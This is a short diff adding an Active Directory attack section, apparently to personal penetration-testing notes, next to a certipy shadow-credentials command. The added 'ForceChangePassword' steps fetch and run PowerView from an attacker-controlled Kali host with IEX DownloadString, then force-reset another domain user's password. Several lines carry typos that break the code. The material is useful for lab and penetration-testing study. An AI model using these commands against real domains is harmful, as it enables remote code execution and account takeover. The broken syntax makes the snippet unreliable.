@@ -55,3 +55,12 @@ http://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad
 ```
 certipy-ad shadow auto -u '<user1>@<domain>' -p "<U1 pass>" -account '<User2>' -dc-ip '<IP>' 
 ```
+### ForceChangePassword
+Inside *Evil-WinRM* session
+```
+IEX (New-ObjectNet.WebClient).DownloadString('http://<KALI IP>:4000/PowerView.ps1')
+$SecPassword = ConvertTo-SecureString '<User1 Pass>' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential ('<Domain>\<User1>', SecPassword)
+$UserPassword = ConvertToSecureString 'qweQWE123!@#!' -AsPlainText -Force
+Set-DomainUserPassword -Identity <User2> -AccountPassword $UserPassword -Credential $Cred
+```
